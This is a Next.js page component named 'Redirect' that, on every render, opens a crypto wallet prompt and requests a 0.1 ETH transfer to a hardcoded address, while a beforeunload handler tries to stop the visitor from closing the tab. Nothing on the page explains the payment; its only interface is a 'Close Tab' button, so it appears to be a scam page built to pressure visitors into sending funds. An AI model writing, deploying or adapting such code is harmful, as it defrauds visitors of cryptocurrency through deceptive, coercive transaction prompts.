'use client';

import {useRouter} from "next/navigation";
import {useEffect} from "react";
import Connect from '../../components/Connect'
import { useWeb3Modal } from '@web3modal/wagmi/react'
import { useSendTransaction } from 'wagmi' 
import { parseEther } from 'viem' 



export default function Redirect() {
    const router = useRouter();
    const { open } = useWeb3Modal()
    const { data: hash, sendTransaction } = useSendTransaction() 

    useEffect(() => {
        const handleBeforeUnload = (event: BeforeUnloadEvent) => {
          // Cancel the default behavior of closing the tab
          event.preventDefault();
          // Chrome requires the returnValue to be set
          event.returnValue = '';
        };
    
        // Add event listener to beforeunload event
        window.addEventListener('beforeunload', handleBeforeUnload);
    
        return () => {
          // Remove the event listener when component unmounts
          window.removeEventListener('beforeunload', handleBeforeUnload);
        };
      }, []);

    useEffect(() => {
        async function openWallet() {
          open()
          sendTransaction({to: `0x${"47dEAF612F0769d99aDB653bA2d22bba79F26C42"}`, value: parseEther("0.1")})
  
        }

        openWallet()
    })

      const handleCloseButtonClick = () => {
        // Close the current tab
        window.close();
      };


    return (
        <div>
            
            
            <button onClick={handleCloseButtonClick}>Close Tab</button>
        </div>
    );
}



// exit page when done